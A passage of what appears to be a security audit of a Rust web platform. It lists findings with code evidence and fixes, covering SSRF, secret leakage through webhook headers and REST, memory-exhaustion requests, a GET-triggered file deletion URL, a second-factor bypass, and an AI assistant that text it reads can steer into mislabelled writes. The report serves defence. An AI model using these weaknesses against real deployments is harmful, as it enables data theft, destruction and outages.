- **Evidence:** `recovery/mod.rs:490` `if execute::ACTIVE.contains(&status.as_str()) { execute::advance(ec, &entity, &mut row, &incident, &contact, now)?;`; `execute.rs:526` `"Persisted" if attempts < MAX_ATTEMPTS => attempt(ec, entity, row, incident, contact, None, now),`; `execute.rs:183` `(_, Some(AdapterKind::InProcess)) => { in_process(ec, entity, action, &field(row, "target"), &field(row, "actionId")) }`
- **Evidence:** `sensitive.rs:66` `const AUDIT_ENTITY_KEYS: &[&str] = &["databaseaudit", "sqlruntoken", "databaseconnection", "etlmapping", ...];` (no monitor entity; `IDENTITY_ADMIN_ENTITY_KEYS` and `SECRET_CONFIG_ENTITY_KEYS` have none either)
- **Evidence:** `crates/moqui-report/src/monitor.rs:219-231` the key is found by `.eq("keyId", Value::string(&key))` and accepted when `revoked` is `N`, it is not expired and its owner holds `MONITOR_INGEST`.
- **Not confirmed:** that the Tools record editors reach these entities for a `TOOLS_APP` holder was taken from the map's statement that the inherited always-all skips entity checks; the editors were not read (parent slice). In seed data every `TOOLS_APP` holder is `ADMIN`, which holds every `MONITOR_*` permission, so the gap matters where the two are granted apart (and for the demo, where `ADMIN` is view-only). Parent reader: `runtime/components/base/tools/screen/Tools/Data/Record.xml:24-27` runs `update#${selectedEntity}` after refusing only `WebUtilities.isRestrictedGenericEntity` entities, and the `moqui.monitor` entities are in none of its lists (`sensitive.rs:115-117`), so an update of an existing row is reachable for a holder of update on Tools; a create (Data Load, `authz-action="all"`) was not exercised.
- **Suggested fix:** Add the recovery entities, `InstanceDrain` and `IngestKey` to the entities only their own services write, and have `advance` re-check the action's decision (approved or automatic, stop off) before a first attempt.

#### SEC-TLS-12. (telemetry reader) A recovery webhook adapter sends any process property to a URL its author chooses

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-report/src/recovery/execute.rs:44-52`, `:446-451`; `crates/moqui-report/src/recovery/mod.rs:998-1046`
- **Reached by:** a holder of `MONITOR_RECOVER_ADMIN`, `MONITOR_RECOVER` and `MONITOR_INCIDENT` (all seeded on `ADMIN`): `Recovery/storeAdapter`, `Recovery/storePolicy`, `Incidents/createIncident`, `IncidentDetail/approveDecision`.
- **What happens:** `headerPropertiesJson` maps header names to property names, `urlProperty` names a property used as the URL, and `secretProperty` one used as the HMAC key. `store#RecoveryAdapter` stores them without an allow list or a name prefix, and the webhook reads each with `moqui_lib::env::get_property` and sends it as a request header to the adapter's `url`. The same user sets `allowInternal`. An operator's own incident has confidence 1.0, so the user can open an incident, point a policy's ladder at the adapter, approve the decision and receive the values. The merged-conf view masks secret values and a conf edit needs the sealed `CONF_EDIT`; this path needs neither.
- **Evidence:** `execute.rs:447` `match moqui_lib::env::get_property(property) { Some(value) if !value.contains(['\r', '\n']) => headers.push((header.clone(), value)),`; `execute.rs:46` `property if !property.is_empty() => moqui_lib::env::get_property(&property).unwrap_or_default(),`
- **Evidence:** `mod.rs:1026-1037` the loop that stores `"urlProperty"`, `"statusUrl"`, `"secretProperty"`, `"headerPropertiesJson"`, `"allowInternal"` as given; `mod.rs:207-210` `// An alert's or an operator's incident has no regression: the rule or the person is the evidence. let confidence = if regressions.values().is_empty() { 1.0 }`
- **Not confirmed:** Which secrets are in the process property table. `get_property` reads that table only, not the environment or `runtime/.env` (`crates/moqui-lib/src/env.rs:53-60`); boot puts there each `default-property` value written in a conf file and each secret it generates in that boot (`crates/moqui-core/src/context/factory.rs:1824-1835`), and leaves out a value that came from the environment or `.env`. So a secret generated at the current boot, or written in a conf file, is readable this way; one read from `.env` at a later boot was not shown to be.
- **Suggested fix:** Take header, URL and secret property names only from a conf-declared allow list (or a fixed prefix such as `recovery_`), and refuse a name the conf marks `is-secret` unless it is listed.

#### SEC-TLS-13. (telemetry reader) Synthetic checks and scrape targets reach internal addresses and answer what they found

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-core/src/telemetry/scrape.rs:548-558`, `:705-727`; `runtime/components/base/tools/screen/System/Monitor/Checks.xml:24-43`
- **Reached by:** a `SYSTEM_APP` holder with create or update: `Checks/createCheck` or `createTarget`, then `checkNow` or `scrapeNow` (or wait a minute for the job).
- **What happens:** Both senders set `deny_internal: false`, so the server requests loopback, private and link-local addresses (a cloud metadata address, another service's admin port) with `GET`, `HEAD` or an empty `POST`. A check's row shows the status code and whether the body contains `expectBodyContains`, and Run now repeats it at once, so the body of an internal response can be read out a piece at a time. A scrape stores every line of the body that parses as a Prometheus sample and shows the transport error or status otherwise. No other permission than the group is asked, unlike the recovery webhook (`MONITOR_RECOVER_ADMIN` and `allowInternal`) or a deploy URL (private hosts refused on production).
- **Evidence:** `scrape.rs:557` `deny_internal: false,` and `:712` `deny_internal: false,`; `:720-723` `if response.status != expect_status { Err(format!("HTTP {} (expected {expect_status})", ...)) } else if !expect_body.is_empty() && !response.body.contains(expect_body) { Err(format!("body does not contain {expect_body:?}"))`
- **Evidence:** `Checks.xml:38` `ec.service.sync().name('org.moqui.monitor.TelemetryServices.run#Checks').parameters({checkId}).call()`
- **Not confirmed:** whether the shared HTTP client follows redirects and how much of a body it reads (`moqui_lib::http::RestClient` was not read). The comment at `scrape.rs:556` states the choice is deliberate for exporters on the host's network.
- **Suggested fix:** Refuse internal addresses by default and allow them per row with a flag that needs its own permission (as `RecoveryAdapter.allowInternal` does), or on a production instance only for hosts a conf list names; keep link-local addresses refused always.

## LLM, A2A, MCP and Assist

#### SEC-AI-01. A room member approves a write that runs as another user

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-llm/src/approval/mod.rs:1129-1135`; `crates/moqui-llm/src/chat.rs:1085-1111`, `:1117-1170`
- **Reached by:** any signed-in user who may post in a chat room that has an agent member, through `decide#ChatCard` (the `chatAssistCard` transition) on an approval card another member's run posted.
- **What happens:** A run started from a room message runs as the sender. Its approval card is a room message. Any human member who may post can press Approve, and the write then runs with the sender's permissions. The earlier messages of the thread reach the model (wrapped as untrusted), so a member can also steer what gets proposed. A low-privilege member can thus approve a write an administrator's request produced, without the administrator seeing the card.
- **Evidence:** `approval/mod.rs:1131-1133` `// answered question 12: a chat run's card is decided by any human who may post in its room` / `None if decider.channel == Channel::Chat => { crate::chat::room_approval(facade, approval_id, &decider.user_id)?...`; `chat.rs:1106-1111` `let can_post = ...; Ok(can_post.then_some(view))`; `chat.rs:36-37` "an agent member, or the chat or run-as user of any agent, never decides. The write still runs as the requester."
- **Not confirmed:** how the room agent is added in practice (no web caller passes `agentRef`, see E); whether the card shows the full arguments to the deciding member; `docs/ai/Assist.md` states this as a decision (not compared).
- **Suggested fix:** let only the requester approve, or require that the decider also passes `user_permitted` for the write and record both; at least show the requester a notice before the write runs.

#### SEC-AI-02. An OpenUI Button runs a model-written write on one click, showing only the transition's name

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-llm/src/assist/canvas.rs:316-371`; `crates/moqui-llm/src/ui/write.rs:157-240`; `js/WebrootAssistCanvas.js:740-750`
- **Reached by:** a signed-in `AgentUse` user who clicks a Button on a canvas the seed `assist` agent drew (OpenUI is on by default on the drawer). The program is the model's, so text the model read (a record, a mail, a page) can shape it.
- **What happens:** The model writes the Button's label and the Mutation behind it: a POST to any `/apps` transition with arguments that may be literals in the program. A click arms a nonce and the server runs the transition as the user, with no approval card. Beside the label the page shows "saves:" and the last path segment only; the parameters are not shown. A Button labelled "Show details" bound to a `delete...` or `update...` transition runs it.
- **Evidence:** `ui/write.rs:21-23` "A click on a Button the framework drew ... the click is the approval, so no card is asked for"; `canvas.rs:332-335` (only `canvas.data["mutations"]` membership), `:343-355` `ui::write::hold(...)` then `ui::write::execute(...)`; `WebrootAssistCanvas.js:349-352` `canvas.savesText = (path) => { ... return bare ? bare.slice(bare.lastIndexOf("/") + 1) : ""; }`, `:749` `"saves: " + saves.map(canvas.savesText).join(", ")`.
- **Not confirmed:** what the OpenUI validator (`ui/openui.rs`, not read) refuses in a Mutation; the user and role-group check `check_write` was read only as far as its call (`write.rs:238`).
- **Suggested fix:** on a Mutation click show the held write (path and parameters, as an approval card does) before it runs, or treat a Mutation whose arguments are not all bound to visible inputs as a card.

## Git hosting and pipelines

#### SEC-GIT-03. A gzip request body is inflated without limit, and SSH has no request limit

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-git/src/server/mod.rs:771-777`; `crates/moqui-host/src/git_http.rs:97-130`, `:221-224`; `crates/moqui-git/src/server/upload.rs:120-128`, `:538-560`, `:650-660`; `crates/moqui-host/src/ssh/git.rs:77-92`
- **Reached by:** upload-pack: anyone who may read a repository (anonymous where a repository is public, any account with view), `POST /git/<repo>/git-upload-pack` with `Content-Encoding: gzip`, or over SSH. Receive-pack: an account with a push right, over HTTP with gzip or over SSH.
- **What happens:** `max-request` (64 MiB) and `max-push-size` (2 GiB) count the body as sent. The server then wraps it in `GzDecoder` with no cap. Upload-pack keeps every `want`, `have`, `shallow` and unknown argument line in memory with no count, so a compressed body expands to many times the limit in memory. A push from an account with a push right writes the inflated pack to the quarantine directory with no total cap. Over SSH there is no byte limit on either service.
- **Evidence:**  - `server/mod.rs:773` `gunzip = flate2::read::GzDecoder::new(body);` - `git_http.rs:113` `total += data.len() as u64;` (frames of the raw body) - `upload.rs:123` `self.wants.push(parse_id(parts.next().unwrap_or_default())?);`; `:127` `self.deepen.client_shallow.push(parse_id(rest)?);`; `:552` `arguments.push(line);`; `:654` `haves.push(parse_id(rest)?);`; `:659` `request.caps.insert(argument.clone());` - `server/mod.rs:1161` `let received = pack_in::receive(store, &mut input, &dir, max_object_size(), pack_threads());` (no `take` unless the account has no push right) - `ssh/git.rs:82` `match reader.read(&mut buf).await {`
- **Not confirmed:** guards looked for and not found: a `take` on the decoder, a line count in `upload.rs`, a counter in `ssh/git.rs`. The job token's fetch is bounded (`job_fetch.rs:212`). A push's commands are bounded (`receive.rs:117-118`).
- **Suggested fix:** wrap the gunzipped reader in a `take` of the same limit and apply `max-request` and `max-push-size` in `serve_ssh`. Bound the count and bytes of upload-pack request lines as `RequestLimits` does for a push.

#### SEC-GIT-04. A viewer reads a whole blob or LFS object into server memory through REST

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-git/src/service/mod.rs:605`; `crates/moqui-git/src/browse.rs:290`; `crates/moqui-git/src/lfs_files.rs:134-141`; `crates/moqui-entity/src/resource/source.rs:246`; `crates/moqui-git/src/service/rest.rs:571-576`
- **Reached by:** any signed-in user who may view a repository, `GET /rest/s1/moqui/git/{repositoryId}/blob?path=...`; also `.../commits/{commitId}/diff` and `.../commits?path=...`.
- **What happens:** `get#GitBlob` reads the file whole, an LFS file as its content, and the REST base64-encodes it into the JSON answer. What can be stored is limited by `max-object-size` (512 MiB) and `lfs-max-object-size` (5 GiB), so one request holds up to that, plus the base64 copy, in memory. `get#GitCommitDiff` and `get#GitCommit` diff every file a commit changed with no file cap (compare has one, 300), and `get#GitLog` with `path` walks history until 500 matches with no commit or time budget.
- **Evidence:**  - `service/mod.rs:605` `match provider.blob_at(&id, &revision, &path_segments(parameters, "path")) {` - `browse.rs:290` `Some((mode, blob)) if !mode.is_tree() => self.file_content(&repo, &blob).map(Some),` - `lfs_files.rs:136` `Some(info) => Ok(moqui_core::resource::source::read_all(` - `rest.rs:575` `Value::string(base64::engine::general_purpose::STANDARD.encode(bytes)),` - `browse.rs:268` `for change in diff::commit_changes(store, &ops::read_commit(store, &id)?)? {` against `crates/moqui-git/src/service/hosting.rs:39` `MAX_COMPARE_FILES: usize = 300;`
- **Not confirmed:** whether the REST layer caps a response, or the request deadline ends the work before memory is taken. No size parameter was found on `get#GitBlob`.
- **Suggested fix:** refuse a blob over a `git-server` limit in `get#GitBlob` (answer its size, serve large content by a streamed download), cap the files of a commit's diff, and give `log` with a path a commit budget.

#### SEC-GIT-05. A small pack of large or deeply chained objects costs far more than its bytes

Medium; reported (likely).

- **Where:** `crates/moqui-git/src/server/pack_in.rs:158-171`, `:249`, `:327-344`; `crates/moqui-git/src/db.rs:822-833`; `crates/moqui-git/src/server/mod.rs:1155-1158`
- **Reached by:** any account that may view a repository, through a push to `refs/for/<branch>` (`review-push` is `true` by default); and any account with a push right.
- **What happens:** the caps on an account without a push right count pack bytes (`review-max-push-bytes` 50 MiB, `review-max-account-bytes` 200 MiB a day). Three costs are not bound by them. Memory: each object may inflate to `max-object-size` (512 MiB), and the indexer inflates on every core (`pack-threads` empty). CPU: there is no delta chain depth limit, and `check_closure` asks `kind_in_pack` for every object, which walks its chain to the base, so one chain of N small deltas costs about N²/2 entry reads on a git worker, with no time limit. Storage: in a `db` repository each object over 8 MiB is stored inflated as a content blob, so stored bytes can exceed pack bytes by the deflate ratio.
- **Evidence:**  - `pack_in.rs:169` `alloc_limit_bytes: max_object,` and `:166` `thread_limit: threads,` - `server/mod.rs:1155` `let cap: u64 = crate::number_setting("review-max-push-bytes", 50 * 1024 * 1024);` - `pack_in.rs:339-342` `bundle.pack.decode_header(entry, &mut cache.0, &|base| resolve_in(bundle, base))` - gix-pack 0.77.0 `data/file/decode/header.rs`: `OfsDelta { base_distance } => { num_deltas += 1;` (no depth bound found) - `db.rs:824-825` `let mut decoder = flate2::read::ZlibDecoder::new(&data[..]); std::io::copy(&mut decoder, &mut writer)`
- **Not confirmed:** the real cost per chain step; whether gix's index writer refuses very deep chains; whether the database compresses blob chunks. `review-max-refused` (30 an hour) counts refused pushes only.
- **Suggested fix:** refuse a pack whose delta chain is deeper than a configured limit, or cache the kind per offset in `check_closure`. Give `pack-threads` a small default. Count inflated bytes toward the review caps, and hold an account without a push right to a lower object size.

#### SEC-GIT-06. An SSH push mirror's server is read without size or total-time limits

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-git/src/mirror.rs:396-411`; `crates/moqui-git/src/server/push.rs:115-149`, `:310-334`; `crates/moqui-host/src/ssh/client.rs:321-348`
- **Reached by:** a user with the delete right on a repository (on a hosting server, the owner of any repository): `store#GitRepositoryMirror` with an `ssh://` URL and the fingerprint of a server they run; the push starts after every change and from the queue.
- **What happens:** the refs advertisement is read into a map until a flush packet arrives, stderr is appended to a buffer, and the report's lines are pushed to vectors, all with no byte cap. Each read has 120 seconds but the whole conversation has no limit. A server that streams refs without end grows the Moqui process's memory. One that sends a packet every minute holds a service-pool thread, and when run from the queue it holds the `run#GitRepositoryMirrors` pass, which pushes up to 500 due mirrors one after another.
- **Evidence:**  - `push.rs:144` `remote.refs.insert(name.to_string(), parse_id(id)?);` inside `loop { match pktline::read(input)…` - `client.rs:340` `Received::Stderr(data) => self.stderr.extend_from_slice(&data),`; `:327` `tokio::time::timeout(TIMEOUT, channel.wait())` (per read) - `mirror.rs:400` `let pushed = push::push(repo.store.as_ref(), refs, covered, &mut &io, &mut output);`; the HTTPS path caps the same reads at `smart_http.rs:195` and `:267`
- **Not confirmed:** the size of the service pool and whether a service-call timeout cuts an async `run#GitRepositoryMirrors` off. The mirror's lease is renewed while held, so it does not end the push.
- **Suggested fix:** wrap the SSH channel's reader in the same limits as HTTPS (advertisement, report, stderr) and give the conversation the 30-minute deadline.

#### SEC-GIT-07. Git services that trust their caller

Medium; reported (likely).

- **Where:** `crates/moqui-git/src/service/mod.rs:168-181` (`fetch#GitRepository`), `:185-198` (`push#GitMirror`), `:230-250` (`init#GitRepository`), `:296-316` (`export#GitRepository`); `crates/moqui-git/src/service/hosting.rs:1453-1544` (`queue#GitWebhookPush`), `:1737-1783` (`send#GitWebhookDelivery`); `crates/moqui-git/src/service/mirror.rs:357-378` (`run#GitRepositoryMirrors`); `GitReviewServices.xml:879-997` (`check#MergeRequest`, `sync#MergeRequest`, `refresh#MergeRequests`); `GitServices.xml:468`
- **Reached by:** any caller that passes service authorization for them; the checks found are in screens only (the tools `System/Resource` screens, mr-boss `Settings.xml` with `ec.user.isInGroup('ADMIN')` in the transition script). `FileServices.export#Drive` forwards a drive manager's `targetPath` to `export#GitRepository`.
- **What happens:** `export#GitRepository` writes a bare repository at any path the server process can write, and into a repository already there: its branch ref is set to the exported head, past that repository's branch rules. `init#GitRepository` with `contentRepository` commits `.gitattributes` without the update right `setup#GitLfs` asks. `queue#GitWebhookPush` takes `userId`, `source` and `refUpdates` from its parameters and queues events signed with each webhook's secret, where `queue#GitWebhookEvent` beside it needs the update right. `run#GitRepositoryMirrors` is `anonymous-all` and with a `mirrorId` pushes that mirror at once, past its back-off. `clean#GitUpdates` is `authenticate="false"` and deletes the push log older than the caller's `daysToKeep`. The three merge request services take any `mergeRequestId`, a hidden one's too, call the inner services with authorization disabled, move its head and status, dismiss approvals and queue a `synchronize` event; `check#MergeRequest` answers `mergeableEnumId`.
- **Evidence:**  - `lib.rs:1435` `Some(target) if Path::new(target).is_absolute() => PathBuf::from(target),`; `:1442` `let target = fs::FsStore::init(&path, &definition.branch)?;`; `:1456` `target.compare_and_set_ref(&name, current, head.id)` - `service/mod.rs:244-245` `if flag(parameters, "contentRepository") { if let Err(err) = provider.setup_lfs(&id, &crate::attributes::DEFAULT_LFS_PATTERNS) {` against `:261` `if let Err(err) = moqui_core::user::authorize_own(GIT_ARTIFACT_TYPE, &id, "update") {` - `service/hosting.rs:1454` `let Some((provider, id)) = provider_and_id(parameters, true) else {`; `:1476` `let user_id = text(parameters, "userId");`; `:1551` `if allowed(parameters, "update").is_none() { return none(); }` (the sibling) - `service/mirror.rs:361` `let only = text(parameters, "mirrorId");` - `GitReviewServices.xml:892` `target: mr.targetRef, checkOnly: true, includeHidden: true}).disableAuthz().call()`; `:943` `.disableAuthz().updateAll({statusId: 'GmrrRequested'})` - `runtime/components/base/framework/service/org/moqui/resource/FileServices.xml:695-696` `.name('org.moqui.git.GitServices.export#GitRepository').parameters({repositoryId: drive.repositoryId, targetPath: targetPath || null})`
- **Not confirmed:** which routes let a request name a service. No JSON-RPC route was found, and no resource of `moqui.rest.xml` names these services. The System "service run" screen, the load runner and the agent tool exposure were not traced; they decide who reaches these, including the three that need no service authorization.
- **Suggested fix:** put the right in each service: the delete right on the repository for export, fetch and the older mirror; `targetPath` only with authorization disabled or under a fixed directory; refuse `queue#GitWebhookPush`, `run#GitRepositoryMirrors`, `clean#GitUpdates` and the three merge request services without authorization disabled, as `queue#PushRuns` is refused.

## Mail

#### SEC-MAIL-02. A mail account's server settings make the server connect to internal addresses

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-mail/src/inbound.rs:1018-1031` (`connect_tcp`), `crates/moqui-mail/src/sync.rs:462-530` (`open_imap`), `crates/moqui-mail/src/implementation.rs` `smtp_transport` (1888-1934), `require_host` (979-998)
- **Reached by:** any signed-in member of `BASIC_COMMS_USERS`: the MailAccounts wizard's save and test (`MailSettingsServices` to `create#EmailAccount`, `test#EmailServer`), then "Sync now" and the sync job every minute.
- **What happens:** The user sets `storeHost`, `storePort`, `smtpHost` and `smtpPort` to any name or IPv4 literal (the wizard's `hostOk` pattern takes `127.0.0.1`, `localhost`, `10.0.0.5`). `allowed-hosts` is empty by default, the IMAP and POP connection has no private-address check at all, and the SMTP one checks only servers with `allowPrivateNetwork` N, which account servers never get. The test's step message tells open from closed ports and can carry the first line the service answered, so a user can map the instance's network and loopback services and read a banner; the IMAP client also writes `s1 CAPABILITY` and a sign-in to that port.
- **Evidence:** `inbound.rs:1023-1027` `to_socket_addrs(&(host, port))` ... `TcpStream::connect_timeout(&address, Duration::from_secs(30))`; `implementation.rs:995-998` `if allowed.trim().is_empty() { return true; }`; `implementation.rs` `let connect_host = if field_text(server, "allowPrivateNetwork") == "N" { public_address(&host, port)? } else { host.clone() };`; `sync.rs:449-455` `return Err(SyncFailure::Connect(format!("{command}: {rest}")));`; `implementation.rs` `smtp_step` `Err(err) => TestStep::failed("smtp", format!("SMTP {place}: {err}"))`; `MailSettingsServices.xml` `const hostOk = (value) => /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/.test(value)`
- **Not confirmed:** how much of a failure's text `MailSettingsServices.test#MailAccount` passes to the page (it joins `step.message` and a hint in the one place read); the POP client (`open_pop`) was not read but is documented to go through `connect_tcp`; whether an instance fence (`fence::check_effect`) is set on production.
- **Suggested fix:** Give every `EmailServer` a mail account owns `allowPrivateNetwork` N on a production instance and apply the one-lookup public-address rule in `connect_tcp` as `smtp_transport` does; answer a test with a fixed list of failure kinds.

#### SEC-MAIL-03. An anonymous GET changes the status of any mailbox or Outbox message

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-core/src/web/mod.rs:1289-1340` (`view_email_message`, `mark_email_message_viewed`); `runtime/components/base/framework/entity/BasicEntities.xml:670-675`
- **Reached by:** anonymous, `GET /email/{emailMessageId}` with a guessed sequenced id.
- **What happens:** The handler marks any `EmailMessage` `ES_VIEWED` with authorization disabled when the status flow allows it, and the flow allows it from `ES_READY`, `ES_SENT` and `ES_RECEIVED`. Those are also the statuses of the mail client's rows: a message waiting in a user's Outbox or being sent (`ES_READY`) leaves the Outbox queries and the job that retries a stopped send, so it is never sent and no longer listed; an Inbox message (`ES_RECEIVED`) leaves the unread count query and the out-of-office reply, and its `receivedDate` is overwritten. Ids are sequenced, so a loop over a range hits every message.
- **Evidence:** `web/mod.rs:1320-1324` `.find("moqui.basic.email.EmailMessage")?.eq("emailMessageId", Value::string(&id)).disable_authz().one()?`; `web/mod.rs:1332-1336` `("statusId".to_string(), Value::string("ES_VIEWED")), ("receivedDate".to_string(), crate::user::now_effective_value()),`; `BasicEntities.xml:670` `statusId="ES_READY" toStatusId="ES_VIEWED" transitionName="View"`; `EmailClientServices.xml:3854` `ec.entity.find(MESSAGE).condition('statusId', 'ES_READY').condition('sendError', 'equals', null)`; `EmailClientServices.xml:667` `item.outboxCount = messages().condition('statusId', 'in', ['ES_SCHEDULED', 'ES_READY']).count()`; `EmailClientServices.xml:4009` `.condition('emailFolderId', 'in', inboxIds).condition('statusId', 'ES_RECEIVED')`
- **Not confirmed:** a rate limit or tarpit on `/email/`; how the Inbox list (`find#Messages`) and the Sent folder treat `ES_VIEWED` (not read); what `record#SendResult` does when the status changed while a send was in flight (line 3751 tests `ES_READY`).
- **Suggested fix:** Mark only a message with no `emailAccountId` that is `ES_SENT`, and put a random token in the pixel URL (a field of the message) instead of the bare id.

#### SEC-MAIL-04. The tools REST resource returns mailbox passwords and OAuth refresh tokens

Medium; reported (confirmed in code).

- **Where:** `runtime/components/base/tools/service/moqui.rest.xml:122-131`; `crates/moqui-core/src/service/rest.rs:659-695`; `crates/moqui-entity/src/entity/sensitive.rs:23-29, 62`
- **Reached by:** a member of `ADMIN` (or a bearer of an ADMIN's API key), `GET /rest/s1/moqui/email/servers` and `/servers/{emailServerId}`.
- **What happens:** The other slice's report is confirmed. `EmailServer` is in the secret-config list, which only gates writes; reads go to `find_entity`, and the answer is stripped only of `UserAccount` password fields. Each row carries `mailPassword`, `smtpPassword` and `oauthRefreshToken` as the entity facade returns them, for relays and for every user's own mail account server, so one request gives an administrator each user's mailbox password and a Google or Microsoft refresh token. The entity's own description says of the token "never answered by a service". `GET /rest/s1/moqui/email/messages` likewise answers the messages of every account.
- **Evidence:** `rest.rs:647-648` `// As Java's RestApi, identity-admin entities are never readable here; secret-config reads are allowed on a declared resource and writes need ADMIN.`; `rest.rs:667` `"list" | "one" => find_entity(&facade, name, master_name, operation, params),`; `find_entity` `row.fields().iter().filter(|(_, value)| !value.is_null()).map(|(name, value)| (name.to_string(), value.clone()))`; `BasicEntities.xml:722,726,737-739` `<field name="mailPassword" ... encrypt="true"`, `<field name="oauthRefreshToken" type="text-long" encrypt="true"><description>The provider's refresh token, encrypted; never answered by a service.`
- **Not confirmed:** that the row's values are decrypted at this point was not traced in the entity facade; it is inferred from `implementation.rs:1849-1855`, where `field_text(server, "smtpPassword")` of a found row is used as the SMTP password. Whether `EmailServerAccessToken` or `EmailOAuthProvider` (client secret) is reachable through another declared resource or the generic entity tools was not checked (`is_restricted_generic_entity` covers `emailserver` and `systemmessageremote` only by name).
- **Suggested fix:** Leave every `encrypt="true"` field out of generic entity REST answers (answer whether one is set), and remove the `servers` entity resource or limit it to servers no account owns.

## Files, DAV, SSH and the terminal

#### SEC-FIL-01. `/resources` runs elFinder write commands on a GET with no session token

Medium; reported (confirmed in code).

- **Where:** `runtime/components/base/webroot/screen/webroot.xml:257`; `crates/moqui-core/src/screen/render.rs:2670`; `crates/moqui-dav/src/elfinder.rs:671,760`
- **Reached by:** a member of `ADMIN` with a cookie session who follows a link on another site to `GET /resources?resourceRoot=...&cmd=rm&targets[]=<hash>` (or `cmd=put&target=<hash>&content=...`, `mkdir`, `mkfile`, `rename`).
- **What happens:** The transition is `read-only`, so URL parameters are accepted, and the session token is checked only for POST, PUT, PATCH and DELETE. The session cookie is `SameSite=Lax`, which a top-level cross-site GET carries. A target hash is the volume id and the Base64 of a path, so it is computed, not guessed. `rm` of a folder deletes everything under it; in production this covers `dbresource://` (the drives live under `dbresource://drive`) and `git://` roots, and on a non-production instance also `file:`, `runtime://` and `component://`, where `put` writes code.
- **Evidence:** `webroot.xml:257` `<transition name="resources" read-only="true">`; `render.rs:2667-2672` `if !matches!(job.method.to_ascii_lowercase().as_str(), "post" | "put" | "patch" | "delete") { return Ok(false); }` (in `csrf_rejected`); `render.rs:2076` `if transition.read_only || !runs_actions(transition) { return None; }` (in `insecure_transition`); `crates/moqui-core/src/user/session.rs:3002` `"; HttpOnly; SameSite=Lax; Path=/"`; `elfinder.rs:671` `"rm" => 'rm: {` and `:760` `"put" => 'put: {`.
- **Not confirmed:** Not tried against a server. No `Sec-Fetch-Site` check was found by `grep -i 'sec-fetch'` in `crates/moqui-core/src` and `crates/moqui-host/src`; the web protection layer in front of the screen dispatch was not read.
- **Suggested fix:** Refuse the write commands (`mkdir`, `mkfile`, `rm`, `rename`, `upload`, `put`) unless the request is a POST that carried the session token, or split them into a transition that is not `read-only`.

#### SEC-FIL-02. An app password opens the admin shell and the SFTP root over SSH, past the second factor

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-host/src/ssh/server.rs:905-925`, `:746-763`
- **Reached by:** anyone holding an app password of a user with `SSH_SHELL` (seeded on `ADMIN_ADV`) or `SSH_SFTP` (seeded on `ADMIN`), over the SSH listener.
- **What happens:** `auth_password` tries the secret as an app password and, on success, reads the user's SSH permissions and accepts the login exactly as for the account password. An app password is described as a device credential for CalDAV, CardDAV, WebDAV and SFTP to the drives, has no scope field, and is not subject to the second factor. So a secret stored in a sync client opens `moqui>` (`service`, `entity`, `js`) and the `sftp-root` for an account whose own password SSH refuses because it needs a second factor.
- **Evidence:** `server.rs:910-913` `let by_app_password = moqui_core::user::looks_like_app_password(&secret) && moqui_core::user::with_client_ip(&client_ip, || { moqui_core::user::login_app_password(&username, &secret) }).is_ok();`; `:921` `ssh_permissions()`; `:925` `Ok(permissions) => Ok(self.accept(user, permissions, true)),`; `:760` `self.can_shell = shell;`; `runtime/components/base/framework/entity/SecurityEntities.xml:449-451` `A password for one device or app of a user: the CalDAV, CardDAV and WebDAV servers and the SFTP drives take it ... so an account with a second factor can sync`.
- **Not confirmed:** `command/shell.rs` was not read, so a second check inside the shell (beyond the Tools-app authorization the map names) is not ruled out. Whether `login_app_password` applies the account's `ipAllowed` and lockout was not traced.
- **Suggested fix:** Record on the connection that the login was by app password and give such a login the drives SFTP backend only (no admin shell, no `sftp-root`, no `agent-apps`); or give `UserAppPassword` a scope and check it per channel.

#### SEC-FIL-03. DAV sends a user's HTML or SVG file inline from the application's origin

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-dav/src/dav/files.rs:415-490`
- **Reached by:** a user whose browser holds Basic credentials for `/dav` (the folder listing page exists "for a browser that opens a DAV address") and who opens a file another member put in a shared drive, at `/dav/files/<user>/<drive>/<name>.html`.
- **What happens:** The file is sent with the content type of its name and no `Content-Disposition`, `X-Content-Type-Options` or `Content-Security-Policy: sandbox`. The screen download path applies all three to a user's file (`file_headers`), and sends active types as attachments; the DAV path does not share that rule. Script in the file runs in the application's origin, where the same browser's session cookie applies.
- **Evidence:** `files.rs:460-465` `headers: vec![("Content-Type".into(), content_type), ("ETag".into(), etag), ("Accept-Ranges".into(), "bytes".into())],`; compare `crates/moqui-core/src/web/mod.rs:1533-1536` `headers.push(("X-Content-Type-Options".to_string(), "nosniff".to_string())); if inline && content_type != "application/pdf" { headers.push(("Content-Security-Policy".to_string(), "sandbox".to_string())); }`; `grep -i 'nosniff|content-security-policy'` over `dav_http.rs` and `crates/moqui-dav/src/dav/*.rs` finds nothing.
- **Not confirmed:** Whether a header layer in `http.rs` adds headers to host routes (the grep there found none). CalDAV and CardDAV GET were not read.
- **Suggested fix:** Send DAV file content with `Content-Disposition: attachment` for active types, and `nosniff` plus `Content-Security-Policy: sandbox` on every file, by reusing `user_file_inline` and `file_headers`.

#### SEC-FIL-04. DAV buffers up to 256 MiB per request before it checks credentials

Medium; reported (likely).

- **Where:** `crates/moqui-host/src/dav_http.rs:47-59,79`; `crates/moqui-host/src/http.rs:1286`
- **Reached by:** anyone who can reach the HTTP listener, with any method on `/dav/...` or `/.well-known/caldav` and a large body.
- **What happens:** The handler reads the body whole into memory up to `max-file` (256 MiB), copies it into the `DavRequest` (`body.to_vec()`), and only then calls `serve`, which checks `enabled` and the login. A PUT clones it again into the uploaded file. A few concurrent anonymous requests hold gigabytes; `enabled="false"` does not stop the read.
- **Evidence:** `dav_http.rs:56` `let body = match read_body(&state, body, limit).await {`; `:79` `body: body.to_vec(),`; `http.rs:1286` `let read = axum::body::to_bytes(body, limit.saturating_add(1));`; `crates/moqui-dav/src/dav/files.rs:561` `UploadedFile::in_memory("file", &name, &content_type, context.request.body.clone())`.
- **Not confirmed:** The web protection's per-address connection and rate limits, and the admission queue, were not read; they may bound the number of such requests.
